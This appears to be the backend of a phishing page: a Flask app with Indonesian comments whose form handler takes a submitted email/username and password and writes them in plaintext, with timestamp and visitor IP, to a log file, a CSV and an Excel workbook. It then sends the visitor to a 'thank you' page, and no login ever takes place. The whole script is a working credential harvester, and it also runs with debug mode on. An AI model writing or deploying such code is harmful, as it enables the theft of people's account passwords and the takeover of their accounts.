from flask import Flask, render_template, request, redirect
import csv
import datetime
from openpyxl import Workbook, load_workbook
import os

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Simpan ke log
    with open("login.log", "a") as f:
        f.write(f"[{waktu}][{ip}] Email: {username} | Password: {password}\n")

    # Simpan ke CSV
    with open("data_login.csv", "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([waktu, ip, username, password])

    # Simpan ke Excel
    if not os.path.exists("data_login.xlsx"):
        wb = Workbook()
        ws = wb.active
        ws.title = "Data Login"
        ws.append(["Waktu", "IP", "Username", "Password"])
    else:
        wb = load_workbook("data_login.xlsx")
        ws = wb.active

    ws.append([waktu, ip, username, password])
    wb.save("data_login.xlsx")

    return redirect("/terima_kasih")

@app.route("/terima_kasih")
def terima_kasih():
    return render_template("terima_kasih.html")

if __name__ == "__main__":
    app.run(debug=True)
